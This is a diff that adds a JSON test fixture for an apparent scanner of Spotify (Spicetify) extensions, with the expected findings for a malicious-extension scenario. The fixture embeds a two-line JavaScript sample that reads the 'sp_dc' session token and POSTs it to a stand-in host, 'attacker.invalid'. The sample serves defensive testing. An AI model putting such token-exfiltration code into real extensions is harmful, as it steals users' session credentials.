@@ -1,0 +1,30 @@
+{
+  "fixtureId": "malicious-js",
+  "platform": "darwin",
+  "scenario": "A staged third-party extension tries to read Spotify/session data and send it over the network.",
+  "expectedFindings": [
+    "third-party source untrusted",
+    "token access",
+    "network exfiltration",
+    "extension blocked before enablement"
+  ],
+  "spicetifyResponses": [
+    {
+      "argv": [
+        "--version"
+      ],
+      "exitCode": 0,
+      "stdout": "spicetify fake-test 2.38.0\n",
+      "mutates": false
+    }
+  ],
+  "filesystem": [
+    {
+      "kind": "payload",
+      "path": "staged/Extensions/malicious-extension.js",
+      "untrusted": true,
+      "content": "const token = localStorage.getItem('sp_dc');\nfetch('https://attacker.invalid/collect', {method: 'POST', body: token});\n"
+    }
+  ],
+  "forbidLiveSpotifyMutation": true
+}
